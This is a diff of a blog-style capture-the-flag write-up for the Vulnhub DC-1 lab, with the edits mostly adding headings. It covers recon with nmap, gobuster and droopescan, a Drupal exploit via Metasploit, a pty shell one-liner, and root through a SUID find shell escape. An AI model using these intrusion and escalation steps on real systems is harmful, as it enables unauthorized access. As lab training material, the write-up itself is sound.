@@ -4,9 +4,8 @@ date: 2020-09-20 +0800
 categories: [pentest-learning,Vulnhub]
 tags: ctf     # TAG names should always be lowercase
 ---
-# DC1-wirteups
 
-## scan
+# information_collect
 
 first we need locate the machine.
 
@@ -26,6 +25,9 @@ than i got it on 192.168.242.129
 than nmap is we need; nmap can scan the machine with the ports,services,text and so on.so it's really useful when we are in the early information-collection steps of pentest/ctf and other place.
 
 so we go on 
+
+## nmap_scan 
+
 ```
 nmap -A <ip-address>
 ```
@@ -67,6 +69,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
 ```
+
+### tips
+
 we can find two things needed high-lights;
 
 one is druapl site! //a kind of cms
@@ -128,7 +133,8 @@ as (HTTP 200 OK!)
 
 save it and open it in vim
 
->Tips:
+#### tips
+
 >
 >use vim command mode as <ESC>
 >
@@ -141,6 +147,9 @@ save it and open it in vim
 > for more detail you can see:[vim search command](https://harttle.land/2016/08/08/vim-search-in-file.html)
 
 Ok now we can use the dir brute force attack it.
+
+## dir_scan
+
 ```
 gobuster dir -u http://<ip-address>/ -w /usr/share/wordlists/dirb/big.txt
 ```
@@ -148,7 +157,9 @@ this command means you go an dir attack (attack the <ip-address>
 
 with wordlists big.txt located in /usr/share/wordlists/dirb 
 
->Tips: the location of /usr/share/wordlists is the kali-linux official wordlist"built-in" kali
+#### tips
+>the location of /usr/share/wordlists is the kali-linux official wordlist"built-in" kali
+
 
 ```
 ===============================================================
@@ -157,7 +168,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 [+] Url:            http://192.168.242.129:80/
 [+] Threads:        10
-[+] Wordlist:       NOTallow
+[+] Wordlist:       NOTallow,big
 [+] Status codes:   200,204,301,302,307,401,403
 [+] User Agent:     gobuster/3.0.1
 [+] Timeout:        10s
@@ -240,7 +251,13 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /user (Status: 200)
 ```
 
-now i got a mistake that the cms scanner WP-scan is built-in kali.
+## cms_scan
+
+### wp_scan
+
+after scanning the dir,to the cms:drupal itself i want know more.
+
+but now i got a mistake that the cms scanner WP-scan is built-in kali.
 so i use the wp-scan in this step. 
 
 ```
@@ -325,10 +342,11 @@ Fingerprinting the version - Time: 00:00:25 <=============> (463 / 463) 100.00% 
 [+] Elapsed time: 00:00:27
 ```
 
+## droopescan
 
-after watching the google,and search the drupal cms scanner.
+after watching the google,i found my fault and search for the drupal-oriented cms scanner.
 
-THE DROOPESCANNNNNNNNNNNNERRRRRRRRRR.
+THE DROOPESCANERRRRRRRRRR.
 
 i scan the website again..
 ```
@@ -362,6 +380,11 @@ i scan the website again..
 
 [+] Scan finished (0:05:01.892400 elapsed)
 ```
+
+#### tips
+
+a little break for mind
+
 so what`s the most important or vulnerable in hacking an cms??
 >1) version
 >>why?
@@ -386,7 +409,11 @@ so what`s the most important or vulnerable in hacking an cms??
 
 so with guides, we can see the version is 7.22-7.26
 
-## getshell
+---
+
+# to getshell
+
+## drupal vulnerability with msf
 
 if we see this versio in metasploit or searchsploit.
 
@@ -408,13 +435,17 @@ get shell!
 
 but the interface is really bad
 
->tips:
+#### tips
+
+>
 >using python command
 >```
 >python -c import pty;pty.spawn("/bin/bash")
 >```
 get shell
 ---
+
+## SQL injections Way
 
 also it got SQLinjections too. searchsploit can help you and create an admin userof you.
 
@@ -432,34 +463,39 @@ we can use msf and create the backdoor phps.
 
 the passage [here](https://stoeps.de/2020/01/05/20200104-walkthrough-dc1/) has more detail.
 
----
+
+## SQL injections unknown way??
+
+
 also if you know the sql injection how to create may you can use the sql to pump your shell out.
 
 but i fail..if anyone can i hope he/she can tell me just send me email...
 
+
+```
+
+
+
+
+
+
+big BLANK to clear you mind,make it as a buffer...
+
+
+
+
+
+
+
+
+```
 ---
 
-```
+# level up your permission
 
+#### tips
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-```
-
-## level up your permission
-
-clear your mind
+frist clear your mind
 
 now we got shell.
 
@@ -498,10 +534,13 @@ the answer is clear.
 >
 >RRRRRRROOOOOOOOOOOOOOOOOOOOTTTTTTT!!!
 
+## little try:sudo
 
 frist we can use sudo can see some script or command you can use as root
 
 NOTHING!it is fucking NOTHING!
+
+## try a little bit:suid
 
 then what we can do?
 
@@ -540,16 +579,17 @@ output>
 /sbin/mount.nfs
 user:www-data
 ```
+
 >i got mistake there too.
 >i think may the procmail is the key
 >but actually not;
 >
 
+#### tips
+
 >so how i got this idea?(means to use the suid)
 >
 > it is TOP2 easiest way to get  shell(one is sudo)
->
->tips:
 >
 >recommend one [site](https://gtfobins.github.io/#) for wrong settings to privilege users
 >
@@ -559,12 +599,17 @@ user:www-data
 
 command is following.
 
+## use find command level up
+
 ```
 find . -exec '/bin/sh' \;-quit
 ```
 also explain [it](https://www.explainshell.com/explain?cmd=find+.+-exec+%27%2Fbin%2Fsh%27+%5C%3B-quit)
 
 ---
+
+## no direct way but a little twist way
+
 another way
 
  we can broswer the file system...
@@ -614,6 +659,7 @@ user.tokens.inc:               PHP script, ASCII text
 pwd
 /var/www/modules/user
 ```
+
 you can see flag1.txt in your www-data root dir
 
 it tell us to see the setting file
@@ -647,6 +693,10 @@ $databases = array (
 
 so get in the mysql database you can see the admin pass(with encrypted one) 
 
+#### tips
+
+google is also a tips.
+
 google"forget admin pass of drupal" can tell us drupal 7 encypt method and other way to access the drupal dashboard.
 
 so the method is you can both crack or change the pass in mysql or use drupal console to reset it. 
@@ -660,11 +710,11 @@ http://<ip-address>/node/2#overlay-context=shell
 Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
 ```
 
-Unh..go to the method one get shell~~;
+Unh..go to the method 1 use find command to get shell~~;
 
 ---
 
-## WIN
+# WIN
 
 now you are root!
 WIN!!!!!
